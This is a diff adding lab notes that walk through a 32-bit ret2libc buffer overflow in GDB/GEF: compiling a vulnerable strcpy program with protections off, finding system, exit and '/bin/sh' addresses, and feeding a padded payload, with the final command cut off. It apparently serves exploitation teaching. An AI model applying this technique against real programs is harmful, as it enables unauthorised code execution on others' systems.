@@ -51,3 +51,39 @@ address of y (on heap):0x804d010
 * gdb-lab/sess2$ ./aslr.out
 address of x (on stack):0xffffc9b8
 address of y (on heap):0x804d010
+
+vuln.c
+gcc -m32 -g -fno-stack-protector -no-pie -o vuln.out vuln.c
+sudo sysctl kernel.randomize_va_space
+objdump -d vuln.out
+gdb -q ./vuln.out
+gef➤  disas vuln
+Dump of assembler code for function vuln:
+   0x08049186 <+0>:     push   ebp
+   0x08049187 <+1>:     mov    ebp,esp
+   0x08049189 <+3>:     push   ebx
+   0x0804918a <+4>:     sub    esp,0x44
+   0x0804918d <+7>:     call   0x804923d <__x86.get_pc_thunk.ax>
+   0x08049192 <+12>:    add    eax,0x2e62
+   0x08049197 <+17>:    sub    esp,0x8
+   0x0804919a <+20>:    push   DWORD PTR [ebp+0x8]
+   0x0804919d <+23>:    lea    edx,[ebp-0x48]
+   0x080491a0 <+26>:    push   edx
+   0x080491a1 <+27>:    mov    ebx,eax
+   0x080491a3 <+29>:    call   0x8049050 <strcpy@plt>
+   0x080491a8 <+34>:    add    esp,0x10
+=> 0x080491ab <+37>:    nop
+   0x080491ac <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x080491af <+41>:    leave
+   0x080491b0 <+42>:    ret
+End of assembler dump.
+vuln starts at 0x08049186, breakpoint is nop <+37> at 0x080491ab, 25 hex is 37 decimal
+gef➤  break *(vuln+0x25) # breakpoint right after strcpy & before vuln returns
+gef➤  run AAAA
+gef➤  print system
+gef➤  print exit
+gef➤  find &system,+99999999,"/bin/sh"
+python3 build_payload.py <system_addr> <exit_addr> <binsh_addr>
+gef➤  break *(vuln+0x25)
+gef➤  run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + bytes.fromhex("
+gef➤  x/32xw $esp
